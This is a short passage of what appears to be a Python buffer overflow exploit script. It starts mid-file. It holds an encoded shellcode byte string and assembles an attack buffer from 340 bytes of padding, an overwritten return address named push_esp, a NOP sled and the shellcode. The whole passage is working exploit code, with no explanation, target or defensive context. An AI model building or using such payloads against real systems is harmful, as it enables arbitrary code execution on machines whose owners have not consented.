...
buf =  b""
buf += b"\xba\x4a\x10\x5e\xd1\xd9\xc4\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x12\x31\x56\x12\x03\x56\x12\x83\xa4\xec\xbc"
buf += b"\x24\x09\xd6\xb6\x24\x3a\xab\x6b\xc1\xbe\xa2\x6d\xa5"
buf += b"\xd8\x79\xed\x55\x7d\x32\xd1\x94\xfd\x7b\x57\xde\x95"
buf += b"\xbb\x0f\x11\xb4\x54\x52\x52\x3e\xec\xdb\xb3\x8e\x88"
buf += b"\x8b\x62\xbd\xe7\x2f\x0c\xa0\xc5\xb0\x5c\x4a\xb8\x9f"
buf += b"\x13\xe2\x2c\xcf\xfc\x90\xc5\x86\xe0\x06\x45\x10\x07"
buf += b"\x16\x62\xef\x48"

push_esp = b"\x03\x15\x10\x41"
msg = b"\x41" * 340
msg += push_esp
msg += b"\x90"*16
msg += buf
